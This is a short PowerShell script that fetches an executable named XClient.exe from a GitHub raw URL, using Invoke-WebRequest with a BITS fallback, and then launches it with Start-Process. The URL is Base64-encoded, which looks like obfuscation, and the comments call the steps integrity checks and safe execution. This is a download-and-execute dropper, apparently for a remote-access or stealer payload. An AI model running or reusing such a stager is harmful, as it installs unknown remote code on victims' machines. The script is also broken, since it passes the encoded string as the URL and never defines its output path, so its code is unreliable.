# Original URL
$originalUrl = 'https://github.com/OneOfOne-byte/34406283/raw/refs/heads/main/XClient.exe';

# Encode the URL using Base64
$encodedUrl = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($originalUrl));

# Download executable instead of embedding Base64
$url=$encodedUrl;
try {
    if (Test-Path $p) { Remove-Item -Path $p -Force }  # Ensure old files don't interfere
    
    # Primary download method
    Invoke-WebRequest -Uri $url -OutFile $p -UseBasicParsing
    
    # Alternative method if Invoke-WebRequest fails
    if (!(Test-Path $p -PathType Leaf)) {
        Write-Host "Primary download failed. Trying alternative method..."
        Start-BitsTransfer -Source $url -Destination $p
    }
    
    # Validate file integrity
    if (Test-Path $p -PathType Leaf -and (Get-Item $p).Length -gt 0) {
        Write-Host "File downloaded successfully to: $p"
        
        # Execute the file safely
        Start-Process -FilePath $p -NoNewWindow
    } else {
        Write-Host "Download failed or file is corrupted."; exit 1
    }
} catch {
    Write-Host "Error encountered: $_"; exit 1
}